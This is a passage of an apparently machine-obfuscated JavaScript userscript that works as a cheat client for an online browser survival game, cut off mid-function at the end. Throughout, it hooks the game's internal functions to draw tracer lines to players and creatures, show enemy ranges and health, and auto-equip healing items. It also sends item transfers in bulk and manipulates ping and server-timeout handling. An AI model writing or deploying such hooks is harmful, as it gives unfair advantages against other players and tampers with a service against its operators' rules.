                a0LOADstring.moveTo(USERTOFIX.cam.x + this.x, USERTOFIX.cam.y + this.y);
                a0LOADstring.lineTo(USERTOFIX.cam.x + this.r.x, USERTOFIX.cam.y + this.r.y);
                a0LOADstring.strokeStyle = "red";
                a0LOADstring.stroke();
                a0LOADstring.restore();
              }
            }
          };
        }
        if (t.type === a0HOOKjob.DEAD_BOX || t.type === a0HOOKjob.CRATE) {
          let eJ = t[f];
          t[f] = function () {
            eJ.apply(this, arguments);
            if (!a0JUMPfile.HideScript.e && a0JUMPfile.VisualHp.e && a0JUMPfile.VisualHp.box && this.currentHp < this.maxHp && this.currentHp > 0) {
              a0LOADstring.save();
              a0LOADstring.font = "22px Baloo Paaji";
              a0LOADstring.strokeStyle = "black";
              a0LOADstring.fillStyle = "white";
              a0LOADstring.textAlign = "center";
              a0LOADstring.textBaseline = "middle";
              a0LOADstring.lineWidth = 6;
              a0LOADstring.strokeText(this.currentHp + "❤️", USERTOFIX.cam.x + this.x, USERTOFIX.cam.y + this.y - 20);
              a0LOADstring.fillText(this.currentHp + "❤️", USERTOFIX.cam.x + this.x, USERTOFIX.cam.y + this.y - 20);
              a0LOADstring.restore();
            }
          };
        }
      }
      v.apply(this, e);
    };
  }
  if (a0ACKNowledgevalue.getTokenForJoinGame) {
    let H = a0ACKNowledgevalue.getTokenForJoinGame;
    a0ACKNowledgevalue.getTokenForJoinGame = async function (e, t, i = false) {
      if (!i) {
        e = () => {
          a0GETList.connect();
        };
      }
      H.call(this, e, t);
    };
  }
  for (let U in a0GETList) {
    if (a0GETList.get_focus === a0GETList[U] && U !== "get_focus") {
      a0GETList[U] = function () {
        if (!a0JUMPfile.Spectator.e) {
          a0GETList.get_focus();
        }
      };
      break;
    }
  }
  if (a0GETList.gather) {
    let B = a0GETList.gather;
    a0GETList.gather = function (e) {
      if (a0CACHebuffer) {
        a0CACHebuffer = false;
        if (a0DEFErpayload !== null) {
          if (a0DRAWjob[a0DEFErpayload]) {
            a0DEFErpayload = null;
          } else if (!a0JUMPfile.AutoCraft.e) {
            if (USERTOFIX.inv.n[a0DEFErpayload]) {
              a0HYDRatequeue(a0DEFErpayload);
              a0PROCesshandler = a0DEFErpayload === a0CONNectloop.HAND ? -1 : a0DEFErpayload;
            }
            a0DEFErpayload = null;
          }
        }
      }
      B.apply(this, arguments);
      a0CACHebool();
    };
  }
  {
    let j = Object.keys(a0MINIfyresult);
    let x = j.find(e => typeof a0MINIfyresult[e] == "function" && a0MINIfyresult[e].length === 0 && a0BUFFerresult(a0MINIfyresult[e].toString().replace(/\s+/g, ""), "();") === 1 && !a0MINIfyresult[e].toString().replace(/\s+/g, "").includes("."));
    if (x) {
      let K = a0MINIfyresult[x];
      a0MINIfyresult[x] = function (...e) {
        K.apply(this, e);
        if (!a0JUMPfile.HideScript.e) {
          if (a0JUMPfile.ShowRangeOfWeapon.e) {
            let t = a0CLONelog.fast_units[USERTOFIX.uid];
            if (t) {
              let i = a0CLONelog.units[a0HOOKjob.PLAYERS].filter(e => !e.ally && e.fly == t.fly && !e.ghost);
              let $ = null;
              let o = false;
              let l = false;
              let n = (t.fly ? 196.8 : 157.6) - 22;
              let s = (t.fly ? 291.8 : 227.6) - 22;
              if (i.length) {
                $ = i.reduce((e, i) => a0CLONescript.dist(t, i) < a0CLONescript.dist(t, e) ? i : e, i[0]);
                if (a0CLONescript.dist(t, $) < n) {
                  l = true;
                  o = true;
                } else if (a0CLONescript.dist(t, $) < s) {
                  l = true;
                }
              }
              a0LOADstring.save();
              a0LOADstring.translate(USERTOFIX.cam.x + t.x, USERTOFIX.cam.y + t.y);
              a0LOADstring.globalAlpha = 0.5;
              a0LOADstring.lineWidth = 1.5;
              if (o) {
                a0LOADstring.strokeStyle = "green";
              } else {
                a0LOADstring.strokeStyle = "white";
              }
              a0LOADstring.beginPath();
              a0LOADstring.arc(0, 0, n, 0, Math.PI * 2);
              a0LOADstring.stroke();
              if (l) {
                a0LOADstring.strokeStyle = "green";
              } else {
                a0LOADstring.strokeStyle = "white";
              }
              a0LOADstring.beginPath();
              a0LOADstring.arc(0, 0, s, 0, Math.PI * 2);
              a0LOADstring.stroke();
              a0LOADstring.restore();
            }
          }
          if (a0JUMPfile.Tracers.e && a0GETList.socket && a0GETList.socket.readyState === 1 && USERTOFIX && USERTOFIX.alive && a0CLONelog.fast_units[USERTOFIX.uid]) {
            let r = USERTOFIX.cam.x + a0CLONelog.fast_units[USERTOFIX.uid].x;
            let c = USERTOFIX.cam.y + a0CLONelog.fast_units[USERTOFIX.uid].y;
            let O = USERTOFIX.cam.x;
            let p = USERTOFIX.cam.y;
            let u = a0CLONelog.units[a0HOOKjob.PLAYERS];
            a0LOADstring.save();
            for (let N = 0; N < u.length; N++) {
              if (u[N].pid !== USERTOFIX.id) {
                a0LOADstring.lineWidth = 2.6;
                a0LOADstring.beginPath();
                a0LOADstring.moveTo(r, c);
                a0LOADstring.lineTo(O + u[N].x, p + u[N].y);
                a0LOADstring.strokeStyle = u[N].ally ? "cyan" : "red";
                if (a0JUMPfile.Tracers.target.teamate && u[N].ally || a0JUMPfile.Tracers.target.enemy && !u[N].ally) {
                  a0LOADstring.stroke();
                }
              }
            }
            function E(e, t) {
              a0LOADstring.save();
              a0LOADstring.lineWidth = 2.6;
              a0LOADstring.beginPath();
              a0LOADstring.moveTo(r, c);
              a0LOADstring.lineTo(O + e.x, p + e.y);
              a0LOADstring.strokeStyle = t;
              a0LOADstring.stroke();
              a0LOADstring.restore();
            }
            a0LOADstring.restore();
            if (a0JUMPfile.Tracers.target.spider) {
              a0CLONelog.units[a0HOOKjob.SPIDER].forEach(e => E(e, "#ffffff"));
            }
            if (a0JUMPfile.Tracers.target.wolf) {
              a0CLONelog.units[a0HOOKjob.WOLF].forEach(e => E(e, "#231f20"));
            }
            if (a0JUMPfile.Tracers.target.rabbit) {
              a0CLONelog.units[a0HOOKjob.RABBIT].forEach(e => E(e, "#eb96bc"));
            }
            if (a0JUMPfile.Tracers.target.hawk) {
              a0CLONelog.units[a0HOOKjob.HAWK].forEach(e => E(e, "#693b1d"));
            }
            if (a0JUMPfile.Tracers.target.kraken) {
              a0CLONelog.units[a0HOOKjob.KRAKEN].forEach(e => E(e, "#6964c9"));
            }
            if (a0JUMPfile.Tracers.target.sandworm) {
              a0CLONelog.units[a0HOOKjob.SAND_WORM].forEach(e => E(e, "#c4c4c4"));
            }
            if (a0JUMPfile.Tracers.target.lavadragon) {
              a0CLONelog.units[a0HOOKjob.LAVA_DRAGON].forEach(e => E(e, "#8c0000"));
            }
            if (a0JUMPfile.Tracers.target.goldenchicken) {
              a0CLONelog.units[a0HOOKjob.GOLDEN_CHICKEN].forEach(e => E(e, "#ffcc00"));
            }
          }
          if (a0JUMPfile.RenderOnTop.e && (a0JUMPfile.RenderOnTop.treasure_chest && a0CLONelog.units[a0HOOKjob.TREASURE_CHEST].forEach(e => {
            e.draw(a0NOOPlist.TREASURE_CHEST, a0NOOPlist.HURT_TREASURE_CHEST, true);
          }), a0JUMPfile.RenderOnTop.player)) {
            let d = a0CLONelog.units[a0HOOKjob.PLAYERS];
            for (let f = 0; f < d.length; f++) {
              let g = d[f];
              if (g.vehicle !== a0CONNectloop.MOUNT_BABY_DRAGON && g.vehicle !== a0CONNectloop.MOUNT_BABY_LAVA && g.vehicle !== a0CONNectloop.MOUNT_HAWK && g.vehicle !== a0CONNectloop.PLANE && g.vehicle !== a0CONNectloop.NIMBUS && g.vehicle !== a0CONNectloop.MOUNT_PARROT && g.vehicle !== a0CONNectloop.MOUNT_VULTURE) {
                if (g.tower === 0) {
                  if (g.tower_fx > 0.001) {
                    let A = 1 + Math.min(1, Math.max(g.tower_fx, 0) / 100) * 0.18;
                    a0LOADstring.save();
                    a0LOADstring.scale(A, A);
                    USERTOFIX.cam.x /= A;
                    USERTOFIX.cam.y /= A;
                    g.x /= A;
                    g.y /= A;
                    g.r.x /= A;
                    g.r.y /= A;
                    g.draw_vehicle(true);
                    g.draw(true);
                    USERTOFIX.cam.x *= A;
                    USERTOFIX.cam.y *= A;
                    g.x *= A;
                    g.y *= A;
                    g.r.x *= A;
                    g.r.y *= A;
                    a0LOADstring.restore();
                  } else {
                    g.draw_vehicle(true);
                    g.draw(true);
                  }
                }
              } else if (g.speed <= 180) {
                a0LOADstring.save();
                let h = 1 + Math.min(1, Math.max(g.vehicle_fx5 - 30, 0) / 180) * 0.35;
                a0LOADstring.scale(h, h);
                USERTOFIX.cam.x /= h;
                USERTOFIX.cam.y /= h;
                g.x /= h;
                g.y /= h;
                g.r.x /= h;
                g.r.y /= h;
                g.draw_vehicle(true);
                g.draw(true);
                USERTOFIX.cam.x *= h;
                USERTOFIX.cam.y *= h;
                g.x *= h;
                g.y *= h;
                g.r.x *= h;
                g.r.y *= h;
                a0LOADstring.restore();
              }
            }
            for (let R = 0; R < d.length; R++) {
              let C = d[R];
              if (C.tower === 1 && (C.speed < 180 || C.vehicle !== a0CONNectloop.MOUNT_BABY_DRAGON && C.vehicle !== a0CONNectloop.MOUNT_BABY_LAVA && C.vehicle !== a0CONNectloop.MOUNT_HAWK && C.vehicle !== a0CONNectloop.PLANE && C.vehicle !== a0CONNectloop.NIMBUS && C.vehicle !== a0CONNectloop.MOUNT_PARROT && C.vehicle !== a0CONNectloop.MOUNT_VULTURE)) {
                let y = 1 + Math.min(1, Math.max(C.tower_fx, 0) / 100) * 0.18;
                a0LOADstring.save();
                a0LOADstring.scale(y, y);
                USERTOFIX.cam.x /= y;
                USERTOFIX.cam.y /= y;
                C.x /= y;
                C.y /= y;
                C.r.x /= y;
                C.r.y /= y;
                C.draw_vehicle(true);
                C.draw(true);
                USERTOFIX.cam.x *= y;
                USERTOFIX.cam.y *= y;
                C.x *= y;
                C.y *= y;
                C.r.x *= y;
                C.r.y *= y;
                a0LOADstring.restore();
              }
            }
            for (let m = 0; m < d.length; m++) {
              let M = d[m];
              if ((M.vehicle === a0CONNectloop.MOUNT_BABY_DRAGON || M.vehicle === a0CONNectloop.MOUNT_BABY_LAVA || M.vehicle === a0CONNectloop.MOUNT_HAWK || M.vehicle === a0CONNectloop.PLANE || M.vehicle === a0CONNectloop.NIMBUS || M.vehicle === a0CONNectloop.MOUNT_PARROT || M.vehicle === a0CONNectloop.MOUNT_VULTURE) && M.speed > 180) {
                a0LOADstring.save();
                let L = 1 + Math.min(1, Math.max(M.vehicle_fx5 - 30, 0) / 180) * 0.35;
                a0LOADstring.scale(L, L);
                USERTOFIX.cam.x /= L;
                USERTOFIX.cam.y /= L;
                M.x /= L;
                M.y /= L;
                M.r.x /= L;
                M.r.y /= L;
                M.draw_vehicle(true);
                M.draw(true);
                USERTOFIX.cam.x *= L;
                USERTOFIX.cam.y *= L;
                M.x *= L;
                M.y *= L;
                M.r.x *= L;
                M.r.y *= L;
                a0LOADstring.restore();
              }
            }
          }
          if (a0JUMPfile.GhostInfo.e) {
            a0CLONelog.units[a0HOOKjob.PLAYERS].forEach(e => {
              if (e.ghost) {
                a0LOADstring.save();
                a0LOADstring.font = "30px Baloo Paaji";
                a0LOADstring.strokeStyle = "black";
                if (e.ally) {
                  a0LOADstring.fillStyle = "cyan";
                } else {
                  a0LOADstring.fillStyle = "red";
                }
                a0LOADstring.lineWidth = 6;
                a0LOADstring.textAlign = "center";
                a0LOADstring.textBaseline = "middle";
                a0LOADstring.strokeText(Math.floor(60 - (performance.now() - e.spawnGhostTime) / 1000) + 1, USERTOFIX.cam.x + e.x, USERTOFIX.cam.y + e.y);
                a0LOADstring.fillText(Math.floor(60 - (performance.now() - e.spawnGhostTime) / 1000) + 1, USERTOFIX.cam.x + e.x, USERTOFIX.cam.y + e.y);
                a0LOADstring.restore();
              }
            });
          }
          if (a0JUMPfile.RenderOnTop.e && a0JUMPfile.RenderOnTop.box) {
            a0CLONelog.units[a0HOOKjob.CRATE].forEach(e => {
              e.draw(a0NOOPlist.CRATE, a0NOOPlist.HURT_DEAD_BOX, true);
            });
            a0CLONelog.units[a0HOOKjob.DEAD_BOX].forEach(e => {
              e.draw(a0NOOPlist.CRATE, a0NOOPlist.HURT_DEAD_BOX, true);
            });
          }
          if (a0JUMPfile.DrawWeaponSwitchDelay.e && USERTOFIX.weapon.wait) {
            let P = a0CLONelog.fast_units[USERTOFIX.uid];
            if (P) {
              let D = Object.values(USERTOFIX.weapon.timeout);
              let T = D[1];
              a0LOADstring.save();
              a0LOADstring.translate(USERTOFIX.cam.x + P.x + 46, USERTOFIX.cam.y + P.y + 43);
              a0LOADstring.beginPath();
              a0LOADstring.globalAlpha = 0.75;
              a0LOADstring.lineWidth = a0BALAncevalues * 4;
              if (P.dist_winter > 0) {
                a0LOADstring.strokeStyle = "black";
              } else {
                a0LOADstring.strokeStyle = "white";
              }
              a0LOADstring.lineCap = "round";
              a0LOADstring.arc(0, 0, a0BALAncevalues * 12, 0, Math.PI * 2 * T);
              a0LOADstring.stroke();
              a0LOADstring.restore();
            }
          }
          if (a0JUMPfile.DrawTimerInPlayer.e && a0JUMPfile.DrawTimerInPlayer.isInMyPlayer) {
            let _ = a0CLONelog.fast_units[USERTOFIX.uid];
            if (_ && !_.ghost) {
              a0LOADstring.save();
              a0LOADstring.translate(USERTOFIX.cam.x + _.x, USERTOFIX.cam.y + _.y + 46);
              a0LOADstring.font = "22px Baloo Paaji";
              a0LOADstring.lineWidth = 3;
              if (Math.floor(11 - (Date.now() - a0LISTenjob.HPTimer) / 1000) > 5) {
                a0LOADstring.fillStyle = "white";
              } else {
                a0LOADstring.fillStyle = "#6da151";
              }
              a0LOADstring.strokeStyle = "black";
              a0LOADstring.textAlign = "center";
              a0LOADstring.textBaseline = "middle";
              let I = Math.floor(11 - (Date.now() - a0LISTenjob.HPTimer) / 1000) > 5 ? Math.floor(11 - (Date.now() - a0LISTenjob.HPTimer) / 1000 - 5) : Math.floor(11 - (Date.now() - a0LISTenjob.HPTimer) / 1000);
              a0LOADstring.strokeText(I, 0, 0);
              a0LOADstring.fillText(I, 0, 0);
              a0LOADstring.restore();
              if (USERTOFIX.winter.tempest && USERTOFIX.blizzard) {
                a0LOADstring.save();
                a0LOADstring.translate(_.x + USERTOFIX.cam.x - 20, _.y + USERTOFIX.cam.y + 46);
                a0LOADstring.font = "22px Baloo Paaji";
                a0LOADstring.lineWidth = 3;
                a0LOADstring.strokeStyle = "black";
                a0LOADstring.fillStyle = "#79ecfd";
                a0LOADstring.textAlign = "center";
                a0LOADstring.textBaseline = "middle";
                let S = performance.now() - a0FORMatzip;
                let k = Math.floor(5 - S % 4000 / 1000);
                a0LOADstring.strokeText(k, 0, 0);
                a0LOADstring.fillText(k, 0, 0);
                a0LOADstring.restore();
              }
            }
          }
          if (a0JUMPfile.DrawHpInMyPlayer.e) {
            let b = a0CLONelog.fast_units[USERTOFIX.uid];
            if (b && !b.ghost) {
              a0LOADstring.save();
              a0LOADstring.translate(USERTOFIX.cam.x + b.x, USERTOFIX.cam.y + b.y);
              a0LOADstring.font = "30px Baloo Paaji";
              a0LOADstring.textAlign = "center";
              a0LOADstring.textBaseline = "top";
              a0LOADstring.lineWidth = 5;
              let v = Math.round(USERTOFIX.gauges.l * 200);
              if (v > a0JUMPfile.DrawHpInMyPlayer.Threshold[1]) {
                a0LOADstring.fillStyle = "#E8F5E9";
                a0LOADstring.strokeStyle = "#1B5E20";
              } else if (v > a0JUMPfile.DrawHpInMyPlayer.Threshold[0]) {
                a0LOADstring.fillStyle = "#FFF3E0";
                a0LOADstring.strokeStyle = "#C77800";
              } else {
                a0LOADstring.fillStyle = "#FFEBEE";
                a0LOADstring.strokeStyle = "#B71C1C";
              }
              a0LOADstring.strokeText(v, 0, -60);
              a0LOADstring.fillText(v, 0, -60);
              a0LOADstring.restore();
            }
          }
          if (a0JUMPfile.ExitVehicle.e) {
            let H = a0CLONelog.fast_units[USERTOFIX.uid];
            if (H) {
              a0LOADstring.save();
              a0LOADstring.translate(USERTOFIX.cam.x + H.x, USERTOFIX.cam.y + H.y);
              a0LOADstring.font = "20px Baloo Paaji";
              a0LOADstring.fillStyle = "white";
              a0LOADstring.strokeStyle = "black";
              a0LOADstring.lineWidth = 4;
              a0LOADstring.strokeText("ExitVehicle", 20, 40);
              a0LOADstring.fillText("ExitVehicle", 20, 40);
              a0LOADstring.restore();
            }
          }
          if (a0JUMPfile.AnimalCounter.e) {
            a0LOADstring.save();
            a0LOADstring.font = "18px Baloo Paaji";
            a0LOADstring.fillStyle = "white";
            a0LOADstring.strokeStyle = "black";
            a0LOADstring.lineWidth = 3;
            let U = 700;
            function B(e, t) {
              let i = a0CLONelog.units[t].length;
              if (i > 0) {
                let $ = e + ": " + i;
                a0LOADstring.strokeText($, 10, U);
                a0LOADstring.fillText($, 10, U);
                U += 20;
              }
            }
            B("Kraken 🐙", a0HOOKjob.KRAKEN);
            B("Sandworm 🐛", a0HOOKjob.SAND_WORM);
            B("LavaDragon 🐉", a0HOOKjob.LAVA_DRAGON);
            B("BabyLava", a0HOOKjob.BABY_LAVA);
            B("BabyDragon", a0HOOKjob.BABY_DRAGON);
            a0LOADstring.restore();
          }
        }
      };
      Object.defineProperty(a0MINIfyresult, "draw_scene", {
        get() {
          return this[x];
        }
      });
    } else {
      console.log("Cant find draw_scene key in game");
    }
  }
  if (a0MINIfyresult.draw_ui) {
    let w = a0MINIfyresult.draw_ui;
    a0MINIfyresult.draw_ui = function () {
      w.apply(this, arguments);
      let e = a0CLONelog.fast_units[USERTOFIX.uid];
      if (!a0JUMPfile.HideScript.e) {
        if (a0JUMPfile.ShowCraftTime.e && USERTOFIX.craft.crafting && e) {
          let t = Object.values(USERTOFIX.craft.timeout);
          let i = t[1];
          let $ = t[4];
          a0LOADstring.save();
          a0LOADstring.translate(USERTOFIX.cam.x + e.x, USERTOFIX.cam.y + e.y);
          a0LOADstring.textAlign = "center";
          a0LOADstring.textBaseline = "middle";
          a0LOADstring.font = "24px Baloo Paaji";
          a0LOADstring.fillStyle = "white";
          a0LOADstring.lineWidth = 5;
          if (a0CLONelog.time) {
            a0LOADstring.strokeStyle = "#287483";
          } else {
            a0LOADstring.strokeStyle = "#59b68a";
          }
          let o = ((1 - i) / $).toFixed(1);
          a0LOADstring.strokeText(o, 0, -122);
          a0LOADstring.fillText(o, 0, -122);
          a0LOADstring.restore();
        }
        if (a0JUMPfile.WorldInfo.e) {
          a0LOADstring.save();
          let l = -75;
          if (USERTOFIX.desert.tempest && a0BALAncefile.complete && a0BALAncefile.naturalWidth !== 0) {
            a0LOADstring.drawImage(a0BALAncefile, USERTOFIX.auto_feed.translate.x + l, USERTOFIX.auto_feed.translate.y - 8);
            l -= 71;
          }
          if (USERTOFIX.winter.tempest && a0ENCRyptfocus.complete && a0ENCRyptfocus.naturalWidth !== 0) {
            a0LOADstring.drawImage(a0ENCRyptfocus, USERTOFIX.auto_feed.translate.x + l, USERTOFIX.auto_feed.translate.y - 8);
          }
          a0LOADstring.restore();
        }
        if (a0JUMPfile.ShowLastDead.e) {
          // a0ACCEptdata(a0JUMPfile.ShowLastDead.Pos, "💀", 10, "black");
          // if (USERTOFIX.bigmap) {
          //   a0OPTImizestring(a0JUMPfile.ShowLastDead.Pos, "💀", 30, "black");
          // }
        }
        if (a0JUMPfile.ShowTotemInMap.e) {
          // a0ACCEptdata(a0HANDlelog, "🗿", 10, "black");
          // if (USERTOFIX.bigmap) {
          //   a0OPTImizestring(a0HANDlelog, "🗿", 30, "black");
          // }
        }
      }
    };
  }
  {
    let J = Object.keys(a0GETList).find(e => typeof a0GETList[e] == "function" && a0GETList[e].length === 7);
    if (J) {
      let z = a0GETList[J];
      a0GETList[J] = function (e, t, i, $, o, l, n) {
        if (Math.floor(11 - (Date.now() - a0LISTenjob.HPTimer) / 1000) < 5 || e / 100 > USERTOFIX.gauges.l) {
          a0LISTenjob.HPTimer = Date.now();
        }
        a0LISTenjob.GaugeTimer = Date.now();
        z.apply(this, arguments);
      };
    } else {
      console.log("Failed to hook client.gauges");
    }
  }
  {
    let F = a0GETList.select_inv;
    function W() {
      if (a0JUMPfile.AutoPilot.e) {
        let e = a0CLONelog.fast_units[USERTOFIX.uid];
        if (USERTOFIX.inv.n[a0CONNectloop.PILOT_HELMET] && e && e.clothe !== a0CONNectloop.PILOT_HELMET && e.vehicle === 0) {
          F.call(this, a0CONNectloop.PILOT_HELMET);
          a0MINIfyvalues = true;
          workerTimers.setTimeout(() => {
            a0MINIfyvalues = false;
          }, a0BUILdresult + 100);
        }
      }
    }
    let G = {
      [a0CONNectloop.MOUNT_BABY_DRAGON]: W,
      [a0CONNectloop.MOUNT_BABY_LAVA]: W,
      [a0CONNectloop.PLANE]: W,
      [a0CONNectloop.MOUNT_HAWK]: W,
      [a0CONNectloop.MOUNT_PARROT]: W,
      [a0CONNectloop.MOUNT_VULTURE]: W,
      [a0CONNectloop.NIMBUS]: W,
      [a0CONNectloop.DIVING_MASK]: function () {
        a0OPTImizedrive = true;
        workerTimers.setTimeout(() => {
          a0OPTImizedrive = false;
        }, a0BUILdresult + 100);
      },
      [a0CONNectloop.BOAT]: function e() {
        if (a0JUMPfile.AutoPirateHat.e) {
          let t = a0CLONelog.fast_units[USERTOFIX.uid];
          if (USERTOFIX.inv.n[a0CONNectloop.PIRATE_HAT] && t && t.clothe !== a0CONNectloop.PIRATE_HAT && t.vehicle === 0) {
            F.call(this, a0CONNectloop.PIRATE_HAT);
          }
        }
      }
    };
    a0GETList.select_inv = function (e) {
      G[e]?.call(this);
      F.apply(this, arguments);
    };
  }
  if (a0GETList.chat) {
    let V = a0GETList.chat;
    a0GETList.chat = async function (...e) {
      if (a0JUMPfile.Translator.e && a0JUMPfile.Translator.IncomingMessage) {
        let t = e[0][2];
        let i = a0JUMPfile.Translator.MyLanguage;
        let $ = await a0KEEPinput(t, i);
        if ($.error) {
          console.log($.error);
        } else if ($.detectedLang != i) {
          e[0][2] = "[" + $.detectedLang + "->" + i + "] " + $.translatedText;
        }
      }
      V.apply(this, e);
    };
  }
  if (a0GETList.send_chat) {
    let Y = a0GETList.send_chat;
    a0GETList.send_chat = async function () {
      if (a0JUMPfile.Translator.e && a0JUMPfile.Translator.OutgoingMessage) {
        let e = arguments[0];
        let t = a0JUMPfile.Translator.TranslateTo;
        let i = await a0KEEPinput(e, t);
        if (i.error) {
          console.log(i.error);
        } else if (i.detectedLang != t) {
          arguments[0] = i.translatedText;
        }
      }
      Y.apply(this, arguments);
    };
  }
  if (a0GETList.gauges_life) {
    let X = a0GETList.gauges_life;
    a0GETList.gauges_life = function (e, t) {
      let i = a0CLONelog.fast_units[USERTOFIX.uid];
      if (i && a0JUMPfile.AutoCrown.e && USERTOFIX.inv.n[a0CONNectloop.CROWN_OF_THE_ANGEL] && !i.ghost && i.clothe !== a0CONNectloop.CROWN_OF_THE_ANGEL && e / 100 < USERTOFIX.gauges.l && e * 2 <= a0JUMPfile.AutoCrown.health_to_activate) {
        if (USERTOFIX.craft.crafting) {
          a0FILTerlog();
        }
        a0HYDRatequeue(a0CONNectloop.CROWN_OF_THE_ANGEL);
      }
      if (a0JUMPfile.AutoBottleZMA.e && a0CLONelog.mode === 6 && e / 100 < USERTOFIX.gauges.l && e * 2 <= a0JUMPfile.AutoBottleZMA.hpForItemActivation && (a0HYDRatequeue(a0CONNectloop.BOTTLE_FULL), !a0KICKstats)) {
        a0KICKstats = true;
        let $ = workerTimers.setInterval(() => {
          if (USERTOFIX.gauges.l * 200 > a0JUMPfile.AutoBottleZMA.hpForItemActivation) {
            workerTimers.clearInterval($);
            a0KICKstats = false;
          }
        }, 10);
      }
      if (Math.round((Date.now() - a0LISTenjob.GaugeTimer) / 1000) % 5 == 0 && e / 100 > USERTOFIX.gauges.l) {
        a0LISTenjob.HPTimer = Date.now();
      }
      if (e / 100 !== USERTOFIX.gauges.l && a0QUEUearray && a0QUEUearray.socket && a0QUEUearray.socket.readyState === 1) {
        a0QUEUearray.send_update_hp(e * 2);
      }
      X.apply(this, arguments);
    };
  }
  if (a0GETList.craft_ok) {
    let q = a0GETList.craft_ok;
    a0GETList.craft_ok = function () {
      let e = null;
      let t = a0CLONelog.fast_units[USERTOFIX.uid];
      if (a0PROCesshandler === a0CONNectloop.BOOK && t) {
        e = t.right;
        t.right = a0CONNectloop.BOOK;
      }
      a0CACHebuffer = true;
      q.apply(this, arguments);
      if (e !== null) {
        t.right = e;
      }
    };
  }
  if (a0CLONelog.delete_units) {
    let Q = a0CLONelog.delete_units;
    a0CLONelog.delete_units = function (e) {
      if (a0MERGehandler) {
        if (!a0ASSIgnparser.includes(e)) {
          a0ASSIgnparser[a0ASSIgnparser.length] = e;
        }
      } else {
        Q.apply(this, arguments);
        if (a0ASSIgnparser.length > 0) {
          for (let t = 0, i = a0ASSIgnparser.length; t < i; t++) {
            Q.call(this, a0ASSIgnparser[t]);
          }
          a0ASSIgnparser = [];
        }
      }
    };
  }
  {
    let Z = document.getElementById("game_body");
    let ee = Z.onresize;
    Z.onresize = function () {
      ee.apply(this, arguments);
      a0NOTIfylist();
    };
    a0NOTIfylist();
  }
  {
    let ea = Object.keys(a0GETList);
    let et = ea.find(e => typeof a0GETList[e] == "function" && a0GETList[e].toString().replace(/\s+/g, "").includes(".length") && a0GETList[e].toString().replace(/\s+/g, "").includes("].time"));
    if (et) {
      let ei = ea.indexOf(et);
      let e$ = ea[ei - 14];
      if (e$ && typeof a0GETList[e$] == "function") {
        let eo = a0GETList[e$];
        a0GETList[e$] = function (e, t, i) {
          if (a0JUMPfile.BulkItems.e) {
            for (i = a0JUMPfile.BulkItems.amount; i > 0;) {
              let $ = i > 255 ? 255 : i;
              eo.call(this, e, t, $);
              i -= $;
            }
          } else {
            eo.apply(this, arguments);
          }
        };
      }
    } else {
      console.log("Failed to hook give_item");
    }
  }
  if (a0GETList.leaderboard) {
    let el = a0GETList.leaderboard;
    a0GETList.leaderboard = function () {
      el.apply(this, arguments);
      if (a0DRAWparser) {
        a0GETList.timeout_server = performance.now();
      }
    };
  } else {
    console.log("Failed to hook function client.leaderboard");
  }
  if (a0GETList.try_ping) {
    let en = Object.keys(a0GETList);
    let es = en.find(e => a0GETList[e] === a0GETList.try_ping);
    let er = en.indexOf(es);
    let ec = en[er - 1];
    Object.defineProperty(a0GETList, "ping_delay", {
      get() {
        return this[ec];
      },
      set(e) {
        this[ec] = e;
      }
    });
    let eO = a0GETList.try_ping;
    a0GETList.try_ping = function () {
      if (a0DRAWparser) {
        if (performance.now() - this.ping_delay > a0INVErttimer.PING_DELAY) {
          this.ping_delay = performance.now();
          this.ping();
        }
      } else {
        eO.apply(this, arguments);
      }
    };
  }
  if (a0GETList.send_build) {
    let ep = a0GETList.send_build;
    a0GETList.send_build = function () {
      ep.apply(this, arguments);
      switch (USERTOFIX.craft.preview) {
        case a0CONNectloop.BRIDGE:
          a0JOINfile = a0CONNectloop.BRIDGE;
          break;
        case a0CONNectloop.ROOF:
          a0JOINfile = a0CONNectloop.ROOF;
          break;
        case a0CONNectloop.PLOT:
          a0JOINfile = a0CONNectloop.PLOT;
          break;
        case a0CONNectloop.BERRY_SEED:
          a0POSTqueue = a0CONNectloop.BERRY_SEED;
          break;
        case a0CONNectloop.WHEAT_SEED:
          a0POSTqueue = a0CONNectloop.WHEAT_SEED;
          break;
        case a0CONNectloop.PUMPKIN_SEED:
          a0POSTqueue = a0CONNectloop.PUMPKIN_SEED;
        case a0CONNectloop.CARROT_SEED:
          a0POSTqueue = a0CONNectloop.CARROT_SEED;
          break;
        case a0CONNectloop.TOMATO_SEED:
          a0POSTqueue = a0CONNectloop.TOMATO_SEED;
          break;
        case a0CONNectloop.BANANA_SEED:
          a0POSTqueue = a0CONNectloop.BANANA_SEED;
          break;
        case a0CONNectloop.GARLIC_SEED:
          a0POSTqueue = a0CONNectloop.GARLIC_SEED;
          break;
        case a0CONNectloop.THORBUSHES_SEED:
          a0POSTqueue = a0CONNectloop.THORBUSHES_SEED;
          break;
        case a0CONNectloop.ALOE_VERA_SEED:
          a0POSTqueue = a0CONNectloop.ALOE_VERA_SEED;
          break;
        case a0CONNectloop.WATERMELON_SEED:
          a0POSTqueue = a0CONNectloop.WATERMELON_SEED;
      }
    };
  }
  if (a0MINIfyresult.trigger_mouseup) {
    let eu = a0MINIfyresult.trigger_mouseup;
    a0MINIfyresult.trigger_mouseup = function () {
      let e = USERTOFIX.ghost.enabled;
      USERTOFIX.ghost.enabled = false;
      eu.apply(this, arguments);
      USERTOFIX.ghost.enabled = e;
    };
    unsafeWindow.removeEventListener("mouseup", eu, false);
    unsafeWindow.addEventListener("mouseup", a0MINIfyresult.trigger_mouseup, false);
  }
  if (a0MINIfyresult.safe_delete) {
    if (a0MINIfyresult.safe_delete.all) {
      let eN = a0MINIfyresult.safe_delete.all;
      a0MINIfyresult.safe_delete.all = function () {
        let e = USERTOFIX.ghost.enabled;
        USERTOFIX.ghost.enabled = false;
        eN.apply(this, arguments);
        USERTOFIX.ghost.enabled = e;
      };
      document.getElementById("yes_delete").removeEventListener("mouseup", eN, false);
      document.getElementById("yes_delete").addEventListener("mouseup", a0MINIfyresult.safe_delete.all, false);
    }
    if (a0MINIfyresult.safe_delete.one) {
      let eE = a0MINIfyresult.safe_delete.one;
      a0MINIfyresult.safe_delete.one = function () {
        let e = USERTOFIX.ghost.enabled;
        USERTOFIX.ghost.enabled = false;
        eE.apply(this, arguments);
        USERTOFIX.ghost.enabled = e;
      };
      document.getElementById("one_delete").removeEventListener("mouseup", eE, false);
      document.getElementById("one_delete").addEventListener("mouseup", a0MINIfyresult.safe_delete.one, false);
    }
  }
  if (USERTOFIX.terminal.commands && USERTOFIX.terminal.write_command) {
    let ed = USERTOFIX.terminal.commands;
    USERTOFIX.terminal.commands = function (e) {
